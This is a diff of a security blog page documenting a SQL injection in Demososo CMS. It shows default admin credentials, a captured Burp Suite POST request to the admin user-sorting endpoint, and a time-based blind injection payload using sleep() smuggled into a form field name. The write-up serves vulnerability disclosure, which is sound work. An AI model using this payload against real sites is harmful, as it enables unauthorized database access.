@@ -103,17 +103,18 @@
 <meta property="og:site_name" content="Emerald Dream">
 <meta property="og:description" content="Demososo CMS SQL injection.">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="https://chirec.github.io/2019/09/05/Demososo-code-audit/00.click.jpg">
 <meta property="og:image" content="https://chirec.github.io/2019/09/05/Demososo-code-audit/01.pos.jpg">
 <meta property="og:image" content="https://chirec.github.io/2019/09/05/Demososo-code-audit/02.burp.jpg">
 <meta property="og:image" content="https://chirec.github.io/2019/09/05/Demososo-code-audit/03.sleep_1.jpg">
 <meta property="og:image" content="https://chirec.github.io/2019/09/05/Demososo-code-audit/04.sleep_5.jpg">
 <meta property="og:image" content="https://chirec.github.io/2019/09/05/Demososo-code-audit/05.sleep_10.jpg">
 <meta property="og:image" content="https://chirec.github.io/2019/09/05/Demososo-code-audit/06.code.jpg">
-<meta property="og:updated_time" content="2019-09-05T04:46:15.128Z">
+<meta property="og:updated_time" content="2019-09-05T08:49:35.921Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="&#39;Demososo-code-audit&#39;">
 <meta name="twitter:description" content="Demososo CMS SQL injection.">
-<meta name="twitter:image" content="https://chirec.github.io/2019/09/05/Demososo-code-audit/01.pos.jpg">
+<meta name="twitter:image" content="https://chirec.github.io/2019/09/05/Demososo-code-audit/00.click.jpg">
 
 
 
@@ -380,7 +381,7 @@
                 
               
 
-              <time title="Created: 2019-09-05 09:27:45 / Modified: 12:46:15" itemprop="dateCreated datePublished" datetime="2019-09-05T09:27:45+08:00">2019-09-05</time>
+              <time title="Created: 2019-09-05 09:27:45 / Modified: 16:49:35" itemprop="dateCreated datePublished" datetime="2019-09-05T09:27:45+08:00">2019-09-05</time>
             
 
             
@@ -423,12 +424,16 @@
 <a id="more"></a>
 <h1 id="SQL-injection"><a href="#SQL-injection" class="headerlink" title="SQL injection"></a>SQL injection</h1><p>After install this CMS, enter admin page through /dmqyjz_v20190822/admindm-yourname/g.php</p>
 <p>log in with admin:admin123</p>
-<p>then visit /dmqyjz_v20190822/admindm-yourname/mod_account/mod_user.php?lang=cn</p>
+<p>click right-top button which is circled by red box</p>
+<p><img src="/2019/09/05/Demososo-code-audit/00.click.jpg" alt></p>
+<p>or visit /dmqyjz_v20190822/admindm-yourname/mod_account/mod_user.php?lang=cn</p>
+<p>click button which is circled by red box</p>
 <p><img src="/2019/09/05/Demososo-code-audit/01.pos.jpg" alt></p>
 <p>Use Burp Suite and set Intercept on to catch this package</p>
 <p><img src="/2019/09/05/Demososo-code-audit/02.burp.jpg" alt></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /dmqyjz_v20190822/admindm-yourname/mod_account/mod_user.php?lang=cn&amp;file=list&amp;act=pos HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://localhost/dmqyjz_v20190822/admindm-yourname/mod_account/mod_user.php?lang=cn</span><br><span class="line">Cookie: UM_distinctid=16cfc4a88ff268-067ca10ef68b488-1262694a-1fa400-16cfc4a890029a; CNZZDATA1256279252=1005958402-1567599470-http%253A%252F%252Flocalhost%252F%7C1567599470; usercookie=77-5ed9412c29c00eda8c8eca41483d82f6; isadmin=y; admindir=admindm-yourname; username=admin; PHPSESSID=1sean1pmkvo9o10v44mub0a8b3</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 31</span><br><span class="line"></span><br><span class="line">99=50&amp;Submit=%E6%8E%92%E5%BA%8F</span><br></pre></td></tr></table></figure>
 <p>and send this package to repeater to compare payloads</p>
+<p>Modify package to see difference</p>
 <p>Payloads:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">99&apos;%09or%09sleep(1)#=50&amp;Submit=%E6%8E%92%E5%BA%8F</span><br></pre></td></tr></table></figure>
 <p><img src="/2019/09/05/Demososo-code-audit/03.sleep_1.jpg" alt></p>
